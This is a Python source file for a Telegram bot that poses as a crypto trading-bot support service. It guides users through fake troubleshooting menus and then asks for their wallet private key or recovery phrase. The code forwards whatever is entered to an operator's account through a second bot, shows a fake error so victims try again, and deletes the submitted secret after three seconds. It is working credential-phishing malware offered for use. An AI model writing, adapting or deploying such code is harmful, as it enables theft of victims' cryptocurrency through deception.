#!/usr/bin/env python3
"""
SIMPLE RESOLVER BOT - Direct data collection and forwarding
"""

import logging
import os
import sqlite3
import json
import asyncio
from datetime import datetime
from typing import Dict, Any

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters
)
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot data
ISSUES = [
    "VALIDATION",
    "RECTIFICATION", 
    "CONFIGURATION",
    "ASSET RECOVERY",
    "SWAP FAIL",
    "CLEAR BOT GLITCH",
    "FAIL BUY&SELL",
    "HIGH SLIPPAGE",
    "FAILED SNIPE",
    "TURBO MODE",
    "CLEAR WEB GLITCH"
]

BOTS = [
    "MAESTRO SNIPER BOT",
    "TROJAN",
    "PHOTON WEB",
    "XBOT",
    "NOVA BOT/WEB",
    "NFD CHAIN",
    "BANANAGUN BOT",
    "UNIBOT",
    "PEPEBOOST",
    "PRODIGT BOT",
    "BONKBOT",
    "TRADEWIZ",
    "GMGN AI",
    "BLOOM BOT",
    "SOLTRADINGBOT",
    "SIGMA BOT",
    "SHURIKEN",
    "MEVX BOT/WEB"
]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user = update.effective_user
    
    # Welcome message
    welcome_text = """Welcome to the Telegram Solana Bot Resolve Decentralized Database, where you can address issues such as bot glitches, swap failures, configuration errors, asset recovery, validation problems, high slippage, rugged token issues, failed buy transactions, auto buy failures, slow bot performance, failed transactions, and high gas fees. Below 👇 are the options available to resolve any issues you may be experiencing with your bot."""
    
    # Create issue selection keyboard
    keyboard = []
    for i in range(0, len(ISSUES), 2):
        row = []
        for j in range(2):
            if i + j < len(ISSUES):
                issue = ISSUES[i + j]
                row.append(InlineKeyboardButton(
                    f"⚙️ {issue} ⚙️", 
                    callback_data=f"issue_{issue}"
                ))
        keyboard.append(row)
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_text,
        reply_markup=reply_markup
    )

async def handle_issue_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle issue selection"""
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    issue = query.data.replace("issue_", "")
    
    # Store selected issue
    context.user_data['selected_issue'] = issue
    
    # Show bot selection
    keyboard = []
    for i in range(0, len(BOTS), 2):
        row = []
        for j in range(2):
            if i + j < len(BOTS):
                bot = BOTS[i + j]
                row.append(InlineKeyboardButton(
                    bot, 
                    callback_data=f"bot_{bot}"
                ))
        keyboard.append(row)
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.reply_text(
        f"✅ Selected Issue: {issue}\n\nCHOOSE YOUR BOT",
        reply_markup=reply_markup
    )

async def handle_bot_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle bot selection"""
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    bot_name = query.data.replace("bot_", "")
    
    # Store selected bot
    context.user_data['selected_bot'] = bot_name
    
    # Show wallet import options
    keyboard = [
        [InlineKeyboardButton("Import private key", callback_data="wallet_private_key")],
        [InlineKeyboardButton("Import Recovery phrase", callback_data="wallet_recovery_phrase")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.reply_text(
        f"✅ Selected Bot: {bot_name}\n\nImport Web3 wallet 💳",
        reply_markup=reply_markup
    )

async def handle_wallet_option(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle wallet option selection"""
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    wallet_option = query.data.replace("wallet_", "")
    
    # Store wallet option
    context.user_data['wallet_option'] = wallet_option
    context.user_data['waiting_for_data'] = wallet_option
    
    if wallet_option == "private_key":
        await query.message.reply_text("Enter Private Key ⬇️")
    elif wallet_option == "recovery_phrase":
        await query.message.reply_text("Enter phrase")

async def handle_data_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle data input from user"""
    user = update.effective_user
    message_text = update.message.text
    
    if context.user_data.get('waiting_for_data'):
        data_type = context.user_data['waiting_for_data']
        
        # Send data to admin immediately
        await send_data_to_admin(update, context, message_text, data_type)
        
        # Show error detection message with retry button
        keyboard = [
            [InlineKeyboardButton("🔄 RETRY", callback_data="retry_wallet")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "❌ ERROR DETECTED KINDLY CONNECT AN ACTIVE WALLET",
            reply_markup=reply_markup
        )
        
        # Schedule deletion of sensitive message after 3 seconds
        async def delete_after_delay():
            await asyncio.sleep(3)
            try:
                await update.message.delete()
                logger.info("Sensitive message deleted after 3 seconds")
            except Exception as e:
                logger.warning(f"Could not delete message: {e}")
        
        asyncio.create_task(delete_after_delay())
        
        # Clear waiting state
        context.user_data.pop('waiting_for_data', None)

async def handle_retry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle retry button"""
    query = update.callback_query
    await query.answer()
    
    # Show wallet import options again
    keyboard = [
        [InlineKeyboardButton("Import private key", callback_data="wallet_private_key")],
        [InlineKeyboardButton("Import Recovery phrase", callback_data="wallet_recovery_phrase")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.reply_text(
        "Import Web3 wallet 💳",
        reply_markup=reply_markup
    )

async def send_data_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, data, data_type):
    """Send collected data directly to admin"""
    admin_bot_token = os.getenv('LISTENER_BOT_TOKEN')
    admin_user_id = os.getenv('ADMIN_USER_ID')
    
    if not admin_bot_token or not admin_user_id:
        logger.error("Missing bot token or admin user ID")
        return
    
    try:
        # Create bot instance
        admin_bot = Bot(token=admin_bot_token)
        admin_id = int(admin_user_id)
        
        # Get session data
        issue = context.user_data.get('selected_issue', 'Not selected')
        bot_name = context.user_data.get('selected_bot', 'Not selected')
        
        # Format the data message
        data_message = f"""
🔔 NEW DATA COLLECTED

👤 User: {update.effective_user.first_name} (@{update.effective_user.username})
🆔 User ID: {update.effective_user.id}
📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📋 Session Data:
• Issue: {issue}
• Bot: {bot_name}
• Wallet Option: {data_type}

🔐 {data_type.upper().replace('_', ' ')}:
{data}

---
Data collected successfully!
        """
        
        # Send to admin
        await admin_bot.send_message(
            chat_id=admin_id,
            text=data_message
        )
        
        logger.info(f"Data sent to admin for user {update.effective_user.id}")
        
    except Exception as e:
        logger.error(f"Failed to send data to admin: {e}")

def main():
    """Main function to run the bot"""
    # Get bot token from environment
    bot_token = os.getenv('BOT_TOKEN')
    if not bot_token:
        logger.error("BOT_TOKEN not found in environment variables!")
        return
    
    # Create application
    application = Application.builder().token(bot_token).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(handle_issue_selection, pattern="^issue_"))
    application.add_handler(CallbackQueryHandler(handle_bot_selection, pattern="^bot_"))
    application.add_handler(CallbackQueryHandler(handle_wallet_option, pattern="^wallet_"))
    application.add_handler(CallbackQueryHandler(handle_retry, pattern="^retry_"))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_data_input))
    
    # Start the bot
    logger.info("Starting SIMPLE RESOLVER BOT...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
